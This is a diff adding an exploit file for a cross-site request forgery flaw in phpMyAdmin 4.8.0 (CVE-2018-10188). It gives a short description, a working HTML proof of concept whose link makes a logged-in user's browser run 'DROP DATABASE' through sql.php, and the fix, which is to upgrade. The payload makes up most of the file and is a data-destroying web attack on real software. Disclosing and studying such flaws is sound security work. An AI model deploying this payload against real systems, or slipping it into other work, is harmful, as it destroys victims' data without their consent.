@@ -1,0 +1,24 @@
+# Exploit Title: phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery
+# Date: 2018-04-20
+# Software Link: https://www.phpmyadmin.net/
+# Author: @revengsh & @0x00FI
+# CVE: CVE-2018-10188
+# Category: Webapps
+
+
+#1. Description
+#The vulnerability exists due to failure in the "/sql.php" script to properly verify the source of HTTP request.
+#This Cross-Site Request Forgery (CSRF) allows an attacker to execute arbitrary SQL statement by sending a malicious request to a logged in user.
+#2. Proof of Concept: This example sends HTTP GET crafted request in order to drop the specified database.
+
+
+<html>
+  <body>
+    <a href="http://[HOST]/phpmyadmin/sql.php?sql_query=DROP+DATABASE+[DBNAME]">
+      Drop database
+    </a>
+  </body>
+</html>
+
+#3. Solution: Upgrade to phpMyAdmin 4.8.0-1 or newer.
+#4. Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10188
